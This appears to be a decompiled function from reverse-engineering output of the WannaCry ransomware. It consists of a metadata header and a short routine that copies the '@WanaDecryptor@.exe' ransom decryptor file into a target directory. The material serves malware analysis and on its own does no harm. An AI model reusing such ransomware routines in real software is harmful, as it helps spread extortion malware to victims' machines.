// --- Metadata ---
// Function Name: CopyDecryptorFileToPath_10003280
// Address: 0x10003280
// Exported At: 20250522_175827
// Signature: unknown_signature
// ---------------
BOOL __stdcall CopyDecryptorFileToPath_10003280(wchar_t *Format)
{
  wchar_t Buffer[360]; // [esp+0h] [ebp-2D0h] BYREF

  swprintf(Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.exe");
  return CopyFileW(L"@WanaDecryptor@.exe", Buffer, 1);
}
